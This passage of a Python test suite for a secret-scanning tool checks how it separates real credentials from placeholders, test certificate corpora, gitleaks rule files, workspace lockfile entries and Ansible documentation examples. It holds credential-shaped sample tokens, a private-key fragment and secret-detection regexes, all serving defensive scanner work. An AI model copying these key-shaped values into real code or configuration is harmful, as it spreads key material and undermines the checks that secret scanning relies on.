            rb"\A([-]?(?:(?:\.\d+)|(?:\d+(?:\.\d*)?)))",
            rb"C:\Users\runner\AppData",
        ],
    )
    def test_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is not None

    @pytest.mark.parametrize(
        "value",
        [
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
            b"npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
            b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            b"glpat-AAAAAAAAAAAAAAAA",
        ],
    )
    def test_key_material_still_is(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is None

    def test_an_installer_property_is_a_placeholder(self) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(b"[MONGO_SERVICE_ACCOUNT_PASSWORD]") is not None
        assert PLACEHOLDER.search(b"xKc9vB2mQ7wRtY4u") is None

    def test_a_certificate_corpus_is_test_material(self) -> None:
        """Twenty-eight keys under `x509/static/` -- a CA, an intermediate, a rollover
        pair, OCSP responders, PKCS#1 and PKCS#8 variants -- are a hierarchy built for
        an authentication test suite. gRPC's vendored `test_creds/` is thirteen more."""
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material("x509/static/intermediate_ca_key.pem")
        assert is_test_material("src/third_party/grpc/dist/src/core/tsi/test_creds/ca.key")
        assert not is_test_material("deploy/production/server.key")

    def test_a_deployed_key_is_not(self, tmp_path) -> None:
        """The control: the same file shape outside a corpus keeps its severity."""
        from cordon_scanner.core.models import Severity

        deploy = tmp_path / "deploy"
        deploy.mkdir()
        (deploy / "server.key").write_bytes(
            assemble(
                "-----BEGIN RSA ",
                "PRIVATE KEY-----\n",
                "MIIEogIBAAKCAQEApzGQY8ArzFscOCT1b8TXURrlIRJwETKfbEKo4frXrXj1MCti\n",
                "-----END RSA ",
                "PRIVATE KEY-----\n",
            ).encode()
        )
        keys = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert keys and any(f.severity >= Severity.HIGH for f in keys)


class TestTheSecondPassOverTheCorpus:
    """Defects found by triaging the repositories the full measurement run reported
    first, while it was still running. Each is a distinct class.

    `gitleaks` 151 -> 0, `rustls` 34 -> 1, `jest` 26 -> 0, `grafana` 38 -> 5,
    `react` 12 -> 1.
    """

    @staticmethod
    def material(path: str, raw: bytes) -> bool:
        from cordon_scanner.core.content import FileContent

        return FileContent(path=path, raw=raw, size=len(raw)).is_rule_material

    def test_a_rule_built_in_code_with_its_own_samples(self) -> None:
        """gitleaks writes its rules in Go and validates each against its own true and
        false positives, so the file holds a rule, a regex, and the sample keys the
        regex is tested with. 132 of its 151 findings were those files.

        Both halves are required: a rule id alone is not enough, and `validate(` is an
        ordinary function name."""
        rule = (
            b"func AnthropicApiKey() *config.Rule {\n"
            b'\tr := config.Rule{\n\t\tRuleID: "anthropic-api-key",\n'
            b"\t\tRegex: utils.GenerateUniqueTokenRegex(`sk-ant-api03-[a-z]{93}AA`, false),\n\t}\n"
            b'\ttps := []string{"sk-ant-api03-" + strings.Repeat("a", 93) + "AA"}\n'
            b'\tfps := []string{"sk-ant-api03-short"}\n'
            b"\treturn utils.Validate(r, tps, fps)\n}\n"
        )
        assert self.material("cmd/generate/config/rules/anthropic.go", rule)

    def test_a_rule_id_alone_is_not_enough(self) -> None:
        assert not self.material(
            "internal/audit/emit.go", b'func emit(e Event) { log.Info("rule_id:", e.RuleID) }\n'
        )

    def test_a_toml_ruleset(self) -> None:
        assert self.material(
            "config/gitleaks.toml",
            b'title = "gitleaks config"\n\n[[rules]]\n'
            b"id = \"slack-bot-token\"\nregex = '''xoxb-[0-9]{10}'''\n"
            b'description = "Slack bot token"\n',
        )

    def test_an_ordinary_toml_is_not(self) -> None:
        assert not self.material(
            "pyproject.toml", b'[project]\nname = "thing"\nversion = "1.0.0"\n'
        )

    def test_a_scanner_suppression_file(self) -> None:
        """A file whose whole purpose is to hold another tool's findings: fingerprints,
        file-and-line references, and in several formats the matched value."""
        assert self.material(".gitleaksignore", b"a1b2c3:config/test.go:aws-access-key:12\n")
        assert self.material(".secrets.baseline", b'{"results": {}}\n')

    @pytest.mark.parametrize(
        "path",
        [
            "bogo/keys/rsa_2048_key.pem",
            "test-ca/ecdsa-p256/ca.key",
            "devenv/docker/blocks/auth/key.pem",
        ],
    )
    def test_a_generated_test_hierarchy_is_test_material(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    def test_a_deployed_key_is_not(self) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material("deploy/production/server.key")
        assert not is_test_material("config/tls/server.key")

    @pytest.mark.parametrize(
        ("value", "sequential"),
        [
            (b"abcdefghijklmnopqrstuvwxyz0123456789", True),
            (b"ABCDEFGHIJKLMNOPQRST", True),
            (b"0123456789ab", True),
            (b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", False),
            (b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7", False),
        ],
    )
    def test_an_alphabet_is_not_a_token(self, value: bytes, sequential: bool) -> None:
        """Entropy cannot tell the alphabet in order from a random string of the same
        characters: as a multiset it is maximally diverse, which is what Shannon
        entropy measures. Grafana assigns exactly that to `TOKEN_ALPHABET`, which is
        what its branch-name generator draws from."""
        from cordon_scanner.detect.secrets import looks_sequential

        assert looks_sequential(value) is sequential

    def test_a_yarn_workspace_entry_needs_no_hash(self, tmp_path) -> None:
        """Every Yarn Berry lockfile contains an entry for its own root, with no
        checksum because there is nothing to fetch. 24 of Jest's 26 blocking findings
        were that one entry, and 616 findings across 202 of 1,427 repositories."""
        (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
        (tmp_path / "yarn.lock").write_bytes(
            b"__metadata:\n  version: 10\n\n"
            b'"browser-resolve@npm:^2.0.0":\n'
            b"  version: 2.0.0\n"
            b'  resolution: "browser-resolve@npm:2.0.0"\n'
            b"  checksum: 10/ad5314db3429a903b07d6445137588665c4677d6276298bb08f0623f05cb1077\n"
            b"  languageName: node\n  linkType: hard\n\n"
            b'"root-workspace-0b6124@workspace:.":\n'
            b"  version: 0.0.0-use.local\n"
            b'  resolution: "root-workspace-0b6124@workspace:."\n'
            b"  languageName: unknown\n  linkType: soft\n"
        )
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" not in ids

    def test_a_registry_entry_without_a_hash_still_is(self, tmp_path) -> None:
        (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}')
        (tmp_path / "yarn.lock").write_bytes(
            b"__metadata:\n  version: 10\n\n"
            b'"left-pad@npm:^1.3.0":\n'
            b"  version: 1.3.0\n"
            b'  resolution: "left-pad@npm:1.3.0"\n'
            b"  languageName: node\n  linkType: hard\n\n"
            b'"right-pad@npm:^1.0.0":\n'
            b"  version: 1.0.0\n"
            b'  resolution: "right-pad@npm:1.0.0"\n'
            b"  checksum: 10/ad5314db3429a903b07d6445137588665c4677d6276298bb08f0623f05cb1077\n"
            b"  languageName: node\n  linkType: hard\n"
        )
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" in ids

    def test_a_photoshop_document_named_png_is_a_naming_error(self) -> None:
        """Jest's `website/static/img/favicon.png` is a PSD. The mismatch check could
        only say "not png image" because PSD was not in the format table, and an image
        saved in the wrong format is a naming error whichever direction it goes."""
        from cordon_scanner.detect.binary import BinaryDetector

        psd = b"8BPS\x00\x01" + b"\x00" * 64
        assert BinaryDetector.mismatch("favicon.png", BinaryDetector.identify(psd)) is None

    def test_an_executable_named_png_still_is_not(self) -> None:
        from cordon_scanner.detect.binary import BinaryDetector

        assert BinaryDetector.mismatch("favicon.png", BinaryDetector.identify(ELF)) is not None


class TestDocumentationInsideSourceIsStillDocumentation:
    """`ansible-collections/community.general` produced 29 findings and every one was
    inside an Ansible module's own documentation: `DOCUMENTATION`, `EXAMPLES` and
    `RETURN` are the contract every one of its thousands of modules carries, a YAML
    document held in a string, and the examples in it are written the way examples are.

    The path test cannot answer this. `plugins/modules/consul_token.py` is source, and
    the example token is inside it.

    Every bare string statement counts, not only the first statement of a scope: a
    string whose value is discarded does nothing at runtime and is there to be read.
    That includes the attribute docstrings PEP 258 describes, which is the convention
    this project's own source is written in -- and the self-scan proved it within one
    run, reporting three credentials in a docstring quoting the Ansible examples above.
    """

    @staticmethod
    def spans(source: str):
        from cordon_scanner.detect.secrets import documentation_spans

        return documentation_spans(source)

    def test_an_ansible_example_block_is_documentation(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        plugins = tmp_path / "plugins" / "modules"
        plugins.mkdir(parents=True)
        (plugins / "consul_token.py").write_bytes(
            (
                "#!/usr/bin/python\n"
                "EXAMPLES = r'''\n"
                "- name: Create a token\n"
                "  community.general.consul_token:\n"
                "    token: " + assemble("8adddd91-0bd6-", "d41d-ae1a-3b49cfa9a0e8") + "\n"
                "'''\n\n"
                "def main():\n    pass\n"
            ).encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert all(f.severity <= Severity.MEDIUM for f in secrets), [
            (f.rule_id, f.severity) for f in secrets
        ]

    def test_the_same_value_in_code_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        plugins = tmp_path / "plugins" / "modules"
        plugins.mkdir(parents=True)
        (plugins / "consul_token.py").write_bytes(
            (
                "TOKEN = " + repr(assemble("8adddd91-0bd6-", "d41d-ae1a-3b49cfa9a0e8")) + "\n"
            ).encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert secrets and any(f.severity >= Severity.HIGH for f in secrets)

    def test_an_attribute_docstring_counts(self) -> None:
        source = 'NAMES = ("a",)\n"""What these names are for."""\n'
        assert len(self.spans(source)) == 1

    def test_a_function_docstring_counts(self) -> None:
        source = 'def f():\n    """Does a thing."""\n    return 1\n'
        assert len(self.spans(source)) == 1

    def test_an_unparsable_file_gets_no_exemption(self) -> None:
        """The safe direction: a file this cannot parse is treated as all code."""
        assert self.spans("def f(:\n  pass\n") == ()


class TestAWorkspaceMemberHasNothingToHash:
    """`POLICY.LOCKFILE.INTEGRITY.001` was 119 findings across 34 of the first 228
    repositories the full run reached, and the npm half of it was every workspace
    member of every monorepo.

    A `package-lock.json` lists a workspace three ways at once: the directory itself
    as a key outside `node_modules/`, a `node_modules/@scope/name` entry with
    `"link": true` pointing at it, and a `resolved` that is a path rather than a URL.
    None of them carries an integrity hash because there is nothing to fetch, and the
    parser recorded none of them as local -- `NousResearch/hermes-agent` supplied
    fourteen in one file.
    """

    @staticmethod
    def graph(raw: bytes):
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.ecosystems.npm import NpmEcosystem

        return NpmEcosystem().parse_lockfile(
            FileContent(path="package-lock.json", raw=raw, size=len(raw))
        )

    LOCK = (
        b'{"name": "root", "lockfileVersion": 3, "packages": {\n'
        b'  "": {"name": "root", "version": "1.0.0"},\n'
        b'  "apps/shared": {"name": "@app/shared", "version": "0.0.0"},\n'
        b'  "node_modules/@app/shared": {"resolved": "apps/shared", "link": true},\n'
        b'  "node_modules/left-pad": {"version": "1.3.0",'
        b' "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",'
        b' "integrity": "sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQGinBN9yTQT"},\n'
        b'  "node_modules/unhashed": {"version": "2.0.0",'
        b' "resolved": "https://registry.npmjs.org/unhashed/-/unhashed-2.0.0.tgz"}\n'
        b"}}\n"
    )

    def test_the_workspace_shapes_are_local(self) -> None:
        local = {e.name for e in self.graph(self.LOCK).entries if e.local}
        assert local == {"@app/shared"}

    def test_a_registry_entry_without_a_hash_is_not(self) -> None:
        """The control, in the same file: one entry really is unhashed, and the rule
        has to keep saying so."""
        graph = self.graph(self.LOCK)
        unhashed = {e.name for e in graph.entries if not e.local and not e.integrity}
        assert unhashed == {"unhashed"}

    def test_end_to_end(self, tmp_path) -> None:
        (tmp_path / "package.json").write_text('{"name": "root", "version": "1.0.0"}')
        (tmp_path / "package-lock.json").write_bytes(self.LOCK)
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" in ids, "the one real entry is still reported"

    def test_a_workspace_only_lockfile_is_quiet(self, tmp_path) -> None:
        (tmp_path / "package.json").write_text('{"name": "root", "version": "1.0.0"}')
        (tmp_path / "package-lock.json").write_bytes(
            b'{"name": "root", "lockfileVersion": 3, "packages": {\n'
            b'  "": {"name": "root", "version": "1.0.0"},\n'
            b'  "apps/shared": {"name": "@app/shared", "version": "0.0.0"},\n'
            b'  "node_modules/@app/shared": {"resolved": "apps/shared", "link": true},\n'
            b'  "node_modules/left-pad": {"version": "1.3.0",'
            b' "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",'
            b' "integrity": "sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQGinBN9yTQT"}\n'
            b"}}\n"
        )
        ids = {f.rule_id for f in Scanner().scan(tmp_path).findings}
        assert "POLICY.LOCKFILE.INTEGRITY.001" not in ids

    def test_a_dotnet_test_certificate_directory_is_test_material(self) -> None:
        """ASP.NET Core keeps eight keys under `src/Shared/TestCertificates/`, which
        the glob list missed because it had three spellings of `test-certs` and not the
        word written out."""
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material("src/Shared/TestCertificates/https-ecdsa.key")
        assert not is_test_material("deploy/certs/server.key")
